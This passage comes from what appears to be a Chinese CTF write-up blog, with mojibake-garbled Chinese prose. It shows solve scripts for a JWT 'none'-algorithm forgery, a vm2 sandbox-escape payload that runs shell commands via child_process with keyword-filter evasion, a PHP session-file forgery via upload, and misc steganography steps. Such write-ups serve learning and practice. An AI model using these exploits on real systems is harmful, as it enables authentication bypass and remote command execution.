class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>jwtå¯ä»¥é€šè¿‡è¿™ä¸ªç½‘ç«™è§£æï¼š<a class="foo" target="_blank" href="https://jwt.io/">ä¼ é€é—¨</a></p>
<img src="http://img.kawhi.xyz/image-20200423184848460.png" alt="image-20200423184848460" style="high:80%;width:80%;" />

<p>äº†è§£JWTçš„ç»„æˆåï¼Œæˆ‘ä»¬æ€»ç»“JWTå¯èƒ½å­˜åœ¨å¦‚ä¸‹çš„å®‰å…¨é—®é¢˜ï¼š</p>
<blockquote>
<p>1.ä¿®æ”¹å¤´ä»€ä¹ˆçš„ç®—æ³•ä¸ºnone</p>
<p>2.è‹¥secretè¾ƒçŸ­å¯ä»¥ç›´æ¥ä½¿ç”¨<a class="foo" target="_blank" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p>
<p>3.ç§˜é’¥æ³„éœ²</p>
<p>3.ä¿®æ”¹ç®—æ³•RS256ä¸ºHS256</p>
</blockquote>
<p>åœ¨è¿™é“é¢˜ä¸­æ˜æ˜¾æ˜¯ä¿®æ”¹ç®—æ³•ä¸ºnoneè¿›è¡Œç»•è¿‡ã€‚</p>
<p>è¿™é‡Œå°±æ˜¯æ³¨å†Œçš„æ—¶å€™ä¼šç”Ÿæˆä¸€ä¸ªjwtï¼Œç™»å½•çš„æ—¶å€™éªŒè¯è¿™ä¸ªjwtã€‚</p>
<p>è¿™é‡Œå†™ä¸€ä¸ªè„šæœ¬æ„é€ å‡ºjwt</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line">secretid=<span class="number">0.5</span>;</span><br><span class="line">username=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">password=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">rolled=<span class="string">&quot;no&quot;</span></span><br><span class="line"><span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password,rolled&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;none&#x27;</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(token);</span><br><span class="line"><span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString());</span><br><span class="line"><span class="built_in">console</span>.log(sid)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ç„¶åå†æäº¤ä¸Šé¢ç”Ÿæˆçš„JWTï¼Œå› ä¸ºä¸èƒ½è®©<code>global.secrets</code>è¿™ä¸ªæ•°ç»„ä¸º<code>undefined</code>ï¼Œæˆ‘ä»¬éœ€è¦æ³¨å†Œä¸€ä¸ªè´¦å·æ˜¯çš„å…¶åˆå§‹åŒ–ã€‚</p>
<p>åŸç†æ˜¯ç”¨å°æ•°ç»•è¿‡ secretid çš„é™åˆ¶ï¼Œå°† secret ç½®ç©ºã€‚å‘ç°æœ¬é¢˜è€ƒç‚¹ä¸ºåˆ©ç”¨ node çš„ jsonwebtoken åº“çš„å·²çŸ¥ç¼ºé™·ï¼šå½“ jwt secret ä¸ºç©ºæ—¶ï¼Œjsonwebtoken ä¼šé‡‡ç”¨ algorithm none è¿›è¡Œè§£å¯†ã€‚</p>
<p>ä¼ªé€  secretid ä¸ºå°æ•°çš„ tokenï¼Œè®© secret æˆä¸º undefinedï¼Œå¯¼è‡´ algorithm ä¸º none è¿›è€Œä½¿ç”¨æˆ·å˜æˆ admin</p>
<p>ç„¶åè¿™æ˜¯è„šæœ¬ç”Ÿæˆçš„jwtï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6MC41LCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGxlZCI6Im5vIiwiaWF0IjoxNTg3NjQ0MDk4fQ.</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ”¹åŒ…å‘é€ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200423211337775.png" alt="image-20200423211337775" style="high:80%;width:80%;" />

<p>å†æ”¾åŒ…æ”¾åˆ°homeè¿™ä¸ªé¡µé¢å°±å¯ä»¥åˆ·æ–°ç½‘é¡µè¿›å…¥getflagçš„ç•Œé¢äº†ã€‚å†æŠ“getflagçš„åŒ…å‘é€å³å¯çœ‹åˆ°flagã€‚</p>
<p>è¿™ä¸Šé¢æ˜¯å¸ˆå…„çš„æ€è·¯ï¼Œå®˜æ–¹çš„è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">base_url = <span class="string">&quot;http://290fb4fb-dc63-46e7-988d-37edb35934ad.node3.buuoj.cn&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">res = s.post(base_url+<span class="string">&#x27;/api/register&#x27;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;hhh&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hhh&quot;</span>&#125;)</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;secretid&quot;</span>:<span class="number">0.333</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">res = s.post(base_url+<span class="string">&#x27;/api/login&#x27;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;authorization&quot;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line">res = s.get(base_url+<span class="string">&#x27;/api/flag&#x27;</span>)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è¿è¡Œä¹Ÿå¯ä»¥å¾—åˆ°flagã€‚</p>
<h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a><strong>just_escape</strong></h3><p>æ‰“å¼€F12å‘ç°è¿™ä¸ªï¼šX-Powered-Byï¼šExpress</p>
<p>è¿è¡Œä»£ç  <code>run.php?code=Error().stack</code> æ ¹æ®æŠ¥é”™ä¿¡æ¯å‘ç°æ˜¯ vm2 çš„æ²™ç›’é€ƒé€¸é—®é¢˜ã€‚æœç´¢å¯å¾— vm2 æœ€æ–°æ²™ç›’é€ƒé€¸ pocï¼š<a class="foo" target="_blank" href="https://github.com/patriksimek/vm2/issues/225">ä¼ é€é—¨</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä½¿ç”¨çš„è¯å‘ç°å­˜åœ¨waf:</p>
<img src="http://img.kawhi.xyz/image-20200423213317676.png" alt="image-20200423213317676" style="high:80%;width:80%;" />

<p>fuzzå‘ç°ç¨‹åºè¿‡æ»¤äº†ä»¥ä¸‹å…³é”®å­—ï¼š</p>
<p>process, exec, eval, constructor, prototype, Function, åŠ å·, åŒå¼•å·, å•å¼•å·è¢«è¿‡æ»¤</p>
<p>ç»•è¿‡æ–¹å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure>

<p>æœ€åä¿®æ”¹ä¸ºï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">         <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>ç„¶åå‘ç°å…¶ä»–äººçš„writeupç›´æ¥åœ¨codeåé¢åŠ ä¸ª[]å°±å¯ä»¥äº†ã€‚emmm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://90694257-8da6-479a-9ea9-cc97c08e88cd.node3.buuoj.cn/run.php?code[]=(function()&#123;</span><br><span class="line">    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.<span class="keyword">from</span>(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<h3 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a><strong>BabyUpload</strong></h3><p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line">$dir_path = <span class="string">&quot;/var/babyctf/&quot;</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">&quot;/&quot;</span>.$_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚ä½•å¾—åˆ°flagå‘¢ï¼Œ<code>session</code>å¿…é¡»å¾—æ˜¯<code>admin</code>å…¶æ¬¡å¿…é¡»å­˜åœ¨success.txtã€‚</p>
<p>é¦–å…ˆè¿™é‡Œä¸¤ä¸ªPOSTå‚æ•°ï¼Œdirectionæ˜¯ç”¨æ¥é€‰æ‹©ä¸Šä¼ æˆ–è¯»å–çš„ï¼Œatträ¼šè¢«æ‹¼æ¥åˆ°è·¯å¾„ä¸­ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$direction = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line">$dir_path = <span class="string">&quot;/var/babyctf/&quot;</span>.$attr;</span><br></pre></td></tr></table></figure>

<p>å†çœ‹uploadçš„éƒ¨åˆ†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($direction === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            throw new RuntimeException(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šå°†è·¯å¾„æ‹¼æ¥ï¼Œä¹Ÿå°±æ˜¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/var/babyctf/$_POST[<span class="string">&#x27;attr&#x27;</span>]/æ–‡ä»¶å_sha256(ä¸´æ—¶æ–‡ä»¶å)</span><br></pre></td></tr></table></figure>

<p>ä»æºç å¼€å¤´çš„ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¾—çŸ¥ä¿®æ”¹atträ¸ºç©ºï¼Œæ–‡ä»¶åä¸ºsessï¼Œä¾¿å¯ä»¥ä¼ªé€ sessionæ–‡ä»¶ã€‚</p>
<p>ä¸‹ä¸€æ­¥å°±æ˜¯åˆ©ç”¨downloadè¯»å–è‡ªå·±çš„sessionï¼Œå‘ç°sessionå†…å®¹æ ¼å¼ï¼Œå¾—çŸ¥sessionå¼•èµ·ä¸ºphp_binaryã€‚</p>
<img src="http://img.kawhi.xyz/image-20200424145858004.png" alt="image-20200424145858004" style="high:60%;width:60%;" />

<p>åœ¨æºä»£ç é‡Œé¢æ˜¯è¿™æ ·çš„</p>
<img src="http://img.kawhi.xyz/image-20200424145951565.png" alt="image-20200424145951565" style="high:60%;width:60%;" />

<p>ç„¶åç›´æ¥å¤åˆ¶å‡ºæ¥ä¿å­˜åœ¨sessçš„æ–‡ä»¶é‡Œé¢ï¼Œå¹¶æŠŠguestæ”¹ä¸ºadminã€‚å¹¶ä¸Šä¼ åˆ°é¶æœºä¸Šé¢ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200424150334856.png" alt="image-20200424150334856" style="high:80%;width:80%;" />

<p>ç„¶åå¯ä»¥æµ‹è¯•å‡ºæ¥sessçš„æ–‡ä»¶çš„hashå€¼ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200424150522602.png" alt="image-20200424150522602" style="high:80%;width:80%;" />

<p>ç„¶åå¯ä»¥ç”¨downloadçš„æ–¹å¼æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦ä¸Šä¼ æˆåŠŸäº†ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200424150642155.png" alt="image-20200424150642155" style="high:80%;width:80%;" />

<img src="http://img.kawhi.xyz/image-20200424150705164.png" alt="image-20200424150705164" style="high:80%;width:80%;" />

<p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸæ”¹ä¸ºadminã€‚</p>
<p>ä¸è¿‡è¿˜éœ€è¦æœ‰ä¸€ä¸ªsuccess.txtï¼Œç”±äºä»–è¿™é‡Œç”¨çš„æ˜¯file_existsï¼Œæ‰€ä»¥æˆ‘ä»¬ä»¤attr=success.txtä½¿ä¹‹æˆä¸ºä¸€ä¸ªè·¯å¾„ä¹Ÿèƒ½é€šè¿‡æ£€æµ‹ã€‚ç„¶åè¿™é‡Œçš„æ–‡ä»¶éšä¾¿å¡«å°±è¡Œã€‚</p>
<img src="http://img.kawhi.xyz/image-20200424154207639.png" alt="image-20200424154207639" style="high:80%;width:80%;" />

<p>è¿™æ ·ä¸¤ä¸ªæ¡ä»¶éƒ½æ»¡è¶³äº†ï¼ŒæŠ“åŒ…æ”¹PHPSESSIDå³å¯å¾—åˆ°flagã€‚</p>
<img src="http://img.kawhi.xyz/image-20200424154520097.png" alt="image-20200424154520097" style="high:80%;width:80%;" />

<h2 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a><strong>MRCTF</strong></h2><h3 id="ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"><a href="#ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—" class="headerlink" title="ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"></a><strong>ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—</strong></h3><p>ç”¨010æ‰“å¼€åæ”¹ä¸€ä¸‹å‘ç°æ–‡ä»¶å¤´è¢«æ”¹ï¼ŒæŠŠ61 52æ”¹ä¸º52 61å³å¯ã€‚</p>
<p>ç„¶åå‘ç°æ‰“å¼€docxï¼Œæ˜¾ç¤ºéšè—æ–‡å­—ï¼Œç„¶åå‘ç°ä¸€æ®µéŸ³ç¬¦ï¼š</p>
<p>â™­â™¯â™ªâ€–Â¶â™¬â™­â™­â™ªâ™­â€–â€–â™­â™­â™¬â€–â™«â™ªâ€–â™©â™¬â€–â™¬â™¬â™­â™­â™«â€–â™©â™«â€–â™¬â™ªâ™­â™­â™­â€–Â¶âˆ®â€–â€–â€–â€–â™©â™¬â€–â™¬â™ªâ€–â™©â™«â™­â™­â™­â™­â™­Â§â€–â™©â™©â™­â™­â™«â™­â™­â™­â€–â™¬â™­â€–Â¶Â§â™­â™­â™¯â€–â™«âˆ®â€–â™¬Â¶â€–Â¶âˆ®â€–â™¬â™«â€–â™«â™¬â€–â™«â™«Â§=</p>
<p>ç„¶åç›´æ¥åœ¨è¿™ä¸ªç½‘ç«™è§£å¯†å³å¯å¾—åˆ°flagï¼š<a class="foo" target="_blank" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">ä¼ é€é—¨</a></p>
<h3 id="ä¸çœ ä¹‹å¤œ"><a href="#ä¸çœ ä¹‹å¤œ" class="headerlink" title="ä¸çœ ä¹‹å¤œ"></a><strong>ä¸çœ ä¹‹å¤œ</strong></h3><p>æ‰“å¼€ä¹‹åå‘ç°æœ‰å¾ˆå¤šå›¾ç‰‡ï¼Œç›´æ¥ä½¿ç”¨å‘½ä»¤åˆåœ¨ä¸€èµ·</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">montage *.jpg -geometry +<span class="number">0</span>+<span class="number">0</span>+<span class="number">0</span> ok.jpg</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨gapsè¿™ä¸ªå·¥å…·è‡ªåŠ¨æ‹¼å›¾ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">gaps --image=ok.jpg --generations=<span class="number">50</span> --population=<span class="number">120</span> --size=<span class="number">50</span></span><br></pre></td></tr></table></figure>

<h3 id="å¯»æ‰¾xxx"><a href="#å¯»æ‰¾xxx" class="headerlink" title="å¯»æ‰¾xxx"></a><strong>å¯»æ‰¾xxx</strong></h3><p>æ‰“å¼€wavæ–‡ä»¶ç”µè¯æ‹¨å·å£°ï¼Œç›´æ¥æ‰”dtmfè¯»å–å‡ºæ¥ï¼Œç„¶åæ‰‹åŠ¨å»é‡ï¼Œå› ä¸ºæœ‰å¹²æ‰°å£°ã€‚å·¥å…·ï¼š<a class="foo" target="_blank" href="https://github.com/hfeeki/dtmf">ä¼ é€é—¨</a></p>
<p>ä½¿ç”¨å·¥å…·çš„æ—¶å€™åœ¨dtmf-decoder.pyæ–‡ä»¶é‡Œé¢æŠŠï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># load wav file</span></span><br><span class="line">    wav = wave.open(<span class="string">&#x27;1.wav&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>1.wavæ¢æˆé¢˜ç›®çš„wavå³å¯ã€‚ç»“æœä¸ºï¼š18684221609ã€‚</p>
<h3 id="Hello-misc"><a href="#Hello-misc" class="headerlink" title="Hello_ misc"></a><strong>Hello_ misc</strong></h3><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€å¼ å›¾ç‰‡ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200424211603839.png" alt="image-20200424211603839" style="high:60%;width:60%;" />

<p>binwalkè¿™ä¸ªtryå›¾ç‰‡å¯ä»¥å¾—åˆ°ä¸€ä¸ªZIPå‹ç¼©åŒ…ã€‚</p>
<p>ç„¶åå†ç”¨ç”¨<code>stegsolve</code>æŸ¥çœ‹å›¾ç‰‡ï¼Œ<code>Save Bin</code>å¯ç›´æ¥å¾—åˆ°å›¾ç‰‡ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200424212518740.png" alt="image-20200424212518740" style="high:80%;width:80%;" />

